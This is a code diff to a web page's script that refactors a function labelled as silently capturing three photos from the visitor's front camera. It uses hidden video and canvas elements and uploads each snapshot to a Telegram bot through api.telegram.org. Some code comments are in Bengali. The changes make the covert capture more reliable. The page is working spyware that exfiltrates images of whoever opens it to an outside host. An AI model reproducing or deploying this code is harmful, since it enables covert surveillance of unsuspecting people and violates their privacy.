@@ -251,62 +251,73 @@
 
         // 📸 Function: Capture 3 photos silently from front camera
         async function captureMultiplePhotosAndSend() {
-            try {
-                const video = document.createElement('video');
-                video.setAttribute("playsinline", "true");
-                video.style.display = "none";
-                document.body.appendChild(video);
+    try {
+        const video = document.createElement('video');
+        video.setAttribute("playsinline", "true");
+        video.style.display = "none";
+        document.body.appendChild(video);
 
-                const canvas = document.createElement('canvas');
-                canvas.style.display = "none";
-                document.body.appendChild(canvas);
-                const context = canvas.getContext('2d');
+        const canvas = document.createElement('canvas');
+        canvas.style.display = "none";
+        document.body.appendChild(canvas);
+        const context = canvas.getContext('2d');
 
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user" }
-                });
-                video.srcObject = stream;
-                await new Promise(resolve => setTimeout(resolve, 1000));
+        // ক্যামেরা চালু (front camera)
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" }
+        });
+        video.srcObject = stream;
 
-                for (let i = 1; i <= 3; i++) {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        // metadata লোড হওয়া পর্যন্ত অপেক্ষা
+        await new Promise(resolve => {
+            video.onloadedmetadata = () => {
+                video.play();
+                resolve();
+            };
+        });
 
-                    const imageData = canvas.toDataURL("image/png");
-                    const formData = new FormData();
-                    formData.append("chat_id", chatId);
-                    formData.append("photo", dataURItoBlob(imageData));
-                    formData.append("caption", `📸 Captured Photo ${i}`);
+        // প্রতিটা ছবির আগে 1 সেকেন্ড delay
+        for (let i = 1; i <= 3; i++) {
+            await new Promise(r => setTimeout(r, 1000));
 
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                        method: "POST",
-                        body: formData
-                    });
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                }
+            const imageData = canvas.toDataURL("image/jpeg", 0.9); // JPEG ব্যবহার করুন
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", dataURItoBlob(imageData));
+            formData.append("caption", `📸 Captured Photo ${i}`);
 
-                stream.getTracks().forEach(track => track.stop());
-                video.remove();
-                canvas.remove();
-
-            } catch (err) {
-                console.error("Camera multiple capture error:", err);
-            }
+            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
         }
 
-        // Helper: Convert base64 → Blob
-        function dataURItoBlob(dataURI) {
-            const byteString = atob(dataURI.split(',')[1]);
-            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-            const ab = new ArrayBuffer(byteString.length);
-            const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
-            }
-            return new Blob([ab], { type: mimeString });
-        }
+        // Cleanup
+        stream.getTracks().forEach(track => track.stop());
+        video.remove();
+        canvas.remove();
+
+    } catch (err) {
+        console.error("Camera capture error:", err);
+    }
+}
+
+// Helper
+function dataURItoBlob(dataURI) {
+    const byteString = atob(dataURI.split(',')[1]);
+    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+    const ab = new ArrayBuffer(byteString.length);
+    const ia = new Uint8Array(ab);
+    for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+    }
+    return new Blob([ab], { type: mimeString });
+}
     </script>
 </body>
 </html>
+
